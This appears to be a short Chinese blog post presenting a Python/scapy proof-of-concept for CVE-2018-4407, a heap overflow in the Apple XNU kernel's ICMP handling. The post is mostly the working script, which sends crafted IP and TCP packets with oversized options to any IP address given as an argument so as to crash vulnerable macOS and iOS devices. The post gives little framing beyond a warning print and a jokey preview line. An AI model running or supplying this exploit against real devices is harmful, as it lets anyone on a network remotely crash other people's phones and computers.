title: "CVE-2018-4407苹果操作系统内核堆缓冲区溢出漏洞验证POC"
date: 2018-11-01 18:00:00 +0800
update: 2018-11-01 18:00:00 +0800
author: me
cover: "-/images/cve-2018-4407.png"
tags:
    - 漏洞
    - poc
    - python
preview: 影响苹果系统哦！我看你们更不更新成IOS12

---


check_icmp_dos.py:

```
# CVE-2018-4407 ICMP DOS 
# https://lgtm.com/blog/apple_xnu_icmp_error_CVE-2018-4407 
# from https://twitter.com/ihackbanme 
import sys 
try: 
	from scapy.all import * 
except Exception as e: 
	print ("[*] You need install scapy first:\n[*] sudo pip install scapy ") 
	
if __name__ == '__main__': 
	try: 
		check_ip = sys.argv[1] 
		print ("[*] !!!!!!Dangerous operation!!!!!!") 
		print ("[*] Trying CVE-2018-4407 ICMP DOS " + check_ip) 
		for i in range(8,20): 
			send(IP(dst=check_ip,options=[IPOption("A"*i)])/TCP(dport=2323,options=[(19,"1"*18),(19,"2"*18)])) 
		print ("[*] Check Over!! ") 
	except Exception as e: 
		print "[*] usage: sudo python check_icmp_dos.py 127.0.0.1" 
```

![cve-2018-4407](-/images/cve-2018-4407.png)